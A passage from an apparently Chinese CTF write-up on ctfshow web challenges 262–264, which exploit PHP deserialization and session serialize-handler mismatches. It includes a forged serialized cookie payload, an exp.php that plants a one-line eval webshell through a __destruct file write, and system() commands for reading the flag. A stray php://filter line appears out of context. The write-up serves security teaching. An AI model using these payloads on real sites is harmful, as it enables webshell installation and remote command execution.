<span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">from</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$f</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">msg</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">to</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$t</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">message</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>payload: <code>Tzo3OiJtZXNzYWdlIjo0OntzOjQ6ImZyb20iO3M6MToiMSI7czozOiJtc2ciO3M6MToiMSI7czoyOiJ0byI7czoxOiIxIjtzOjU6InRva2VuIjtzOjU6ImFkbWluIjt9</code></p>\n<p>设置 cookie 的 msg 为此值，得到 flag</p>\n<h1 id=\"web-263\"><a class=\"anchor\" href=\"#web-263\">#</a> web 263</h1>\n<p>进入后是一个登陆界面，看似为 sql 注入，实则不是</p>\n<p>url 输入 <code>www.zip</code>  可以下载题目的源码，可以看到如下文件结构</p>\n<p><img data-src=\"/%E7%B4%A0%E6%9D%90/ctfshow/Web-vip/web263_1.jpg\" alt=\"\"></p>\n<p>index.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-03 16:28:37</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-06 19:21:45</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token function\">session_start</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t<span class=\"token comment\">// 超过 5 次禁止登陆</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>\t\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limti'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&gt;</span><span class=\"token number\">5</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"登陆失败次数超过限制\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t\t<span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\t <span class=\"token function\">setcookie</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"limit\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'1'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t <span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token delimiter important\">?&gt;</span></pre></td></tr></tbody></table></figure><p>check.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">/*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre># -*- coding: utf-8 -*-</pre></td></tr><tr><td data-num=\"5\"></td><td><pre># @Author: h1xa</pre></td></tr><tr><td data-num=\"6\"></td><td><pre># @Date:   2020-09-03 16:59:10</pre></td></tr><tr><td data-num=\"7\"></td><td><pre># @Last Modified by:   h1xa</pre></td></tr><tr><td data-num=\"8\"></td><td><pre># @Last Modified time: 2020-09-06 19:15:38</pre></td></tr><tr><td data-num=\"9\"></td><td><pre># @email: h1xa@ctfer.com</pre></td></tr><tr><td data-num=\"10\"></td><td><pre># @link: https://ctfer.com</pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>*/</pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">require_once</span> <span class=\"token string single-quoted-string\">'inc/inc.php'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token variable\">$GET</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"u\"</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"pass\"</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$GET</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token variable\">$data</span><span class=\"token operator\">=</span> <span class=\"token variable\">$db</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token punctuation\">[</span>\t<span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token string single-quoted-string\">'UserName0'</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>\t<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>\t\t<span class=\"token string double-quoted-string\">\"AND\"</span><span class=\"token operator\">=&gt;</span><span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\t\t<span class=\"token string double-quoted-string\">\"UserName0[=]\"</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'u'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>\t\t<span class=\"token string double-quoted-string\">\"PassWord1[=]\"</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span> <span class=\"token comment\">// 密码必须为 128 位大小写字母 + 数字 + 特殊符号，防止爆破</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>\t\t<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>\t<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'id'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>\t\t<span class=\"token comment\">// 登陆成功取消次数累计</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>\t\t<span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"success\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"欢迎您\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$data</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'UserName0'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t\t<span class=\"token comment\">// 登陆失败累计次数加 1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t\t<span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>\t\t<span class=\"token keyword\">echo</span> <span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"msg\"</span><span class=\"token operator\">=&gt;</span><span class=\"token string double-quoted-string\">\"登陆失败\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>\t<span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>inc.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token operator\">...</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$status</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">setStatus</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">status</span><span class=\"token operator\">=</span><span class=\"token variable\">$s</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"log-\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"使用\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"登陆\"</span><span class=\"token operator\">.</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">status</span><span class=\"token operator\">?</span><span class=\"token string double-quoted-string\">\"成功\"</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"失败\"</span><span class=\"token punctuation\">)</span><span class=\"token operator\">.</span><span class=\"token string double-quoted-string\">\"----\"</span><span class=\"token operator\">.</span><span class=\"token function\">date_create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-&gt;</span><span class=\"token function\">format</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'Y-m-d H:i:s'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">...</span></pre></td></tr></tbody></table></figure><p>xxxxxxxxxx&nbsp;?file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.phpphp</p>\n<p>可以看到在 inc.php 中，User 的 <code>__destruct</code>  方法有 <code>file_put_contents</code>  方法，那么可以尝试一句话木马写文件，那么必须创建 User 对象</p>\n<p>查看源码流程，由于一开始进入，便会设置 cookie 及 session，故略去 if 为 false 的情况</p>\n<p>index.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limti'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">&gt;</span><span class=\"token number\">5</span><span class=\"token operator\">?</span><span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"登陆失败次数超过限制\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span><span class=\"token variable\">$_SESSION</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_decode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'limit'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>由于在 index.php 中无 User 类，故这里有用的只有设置 session 值</p>\n<p>故还需到 check.php 中，运行 <code>$_COOKIE['limit'] = base64_encode(base64_decode($_COOKIE['limit'])+1);</code></p>\n<p>故设置好 cookie 的 limit 值后，前后各访问一次 index.php 和 check.php，就能创建木马文件</p>\n<p>这里用到了 <code>PHP的session反序列化漏洞</code> 知识，<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuamI1MS5uZXQvYXJ0aWNsZS8xMTYyNDYuaHRt\">参考文章</span></p>\n<h2 id=\"php-session反序列化漏洞\"><a class=\"anchor\" href=\"#php-session反序列化漏洞\">#</a> php session 反序列化漏洞</h2>\n<h3 id=\"phpini-与session有关的配置\"><a class=\"anchor\" href=\"#phpini-与session有关的配置\">#</a> php.ini 与 session 有关的配置</h3>\n<figure class=\"highlight ini\"><figcaption data-lang=\"ini\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token key attr-name\">session.save_path</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">\"\"  --设置session的存储路径</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token key attr-name\">session.save_handler</span><span class=\"token punctuation\">=</span><span class=\"token value attr-value\">\"\" --设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>session.auto_start  boolen --指定会话模块是否在请求开始时启动一个会话,默认为0不启动</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>session.serialize_handler  string --定义用来序列化/反序列化的处理器名字。默认使用php</pre></td></tr></tbody></table></figure><p>其中 <code>session.serialize_handler</code>  共有三项值，各存储方式如下</p>\n<ul>\n<li>\n<p>php_binary：键名的长度对应的 ASCII 字符 + 键名 + 经过 serialize () 函数序列化处理的值</p>\n<p>如： <code>names:6:\"spoock\";</code></p>\n</li>\n<li>\n<p>php：键名 + 竖线 + 经过 serialize () 函数序列处理的值</p>\n<p>如： <code>name|s:6:\"spoock\";</code></p>\n</li>\n<li>\n<p>php_serialize (php&gt;5.5.4)：经过 serialize () 函数序列化处理的值</p>\n<p>如： <code>a:1:{s:4:\"name\";s:6:\"spoock\";}</code></p>\n</li>\n</ul>\n<p>当在 <code>php</code>  引擎设置下解析 <code>a:1:{s:4:\"ryat\";s:30:\"|O:1:\"A\":1:{s:1:\"a\";s:2:\"xx\";}</code>  时，由于在该设置下会以 <code>|</code>  为界，左边为 key，右边为 value，然后进行反序列化，最后得到</p>\n<p><code>a:1:{s:4:\"ryat\";s:30:\"</code>  = A 类对象</p>\n<p>从而得到一个 A 类对象</p>\n<p>因此，在这题，可以利用该原理获取一个 User 类对象</p>\n<p>exp.php</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$status</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">base64_encode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token operator\">.</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"a.php\"</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'&lt;?php eval($_POST[1]);?&gt;'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p><span class=\"red\">注：这里使用 <code>urlencode</code>  主要是为了防止影响结果，在做题时因 <code>+</code>  导致无法出结果</span></p>\n<p>User 对象已经构建，按照前面分析进行操作，生成的木马文件为 <code>log-a.php</code></p>\n<p>访问</p>\n<p><img data-src=\"E:%5Cblog%5Csource%5C%E7%B4%A0%E6%9D%90%5Cctfshow%5CWeb-vip%5Cweb263_2.jpg\" alt=\"\"></p>\n<p>一次 post 以下，得到 flag</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre>1=system('ls');</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>1=system('tac flag.php');</pre></td></tr></tbody></table></figure><h1 id=\"web-264\"><a class=\"anchor\" href=\"#web-264\">#</a> web 264</h1>\n<p>相比较于 web262，此时反序列化对象由 index.php 中的 <code>$_SESSION['msg']</code>  传递，因此不能像 web262 那样解题，而是涉及到字符串逃逸。</p>\n<p>这一题的字符串逃逸比较简单</p>\n<p>首先编写以下代码</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">message</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$from</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$msg</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$to</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token variable\">$token</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$m</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$t</span><span class=\"token punctuation\">)</span><span 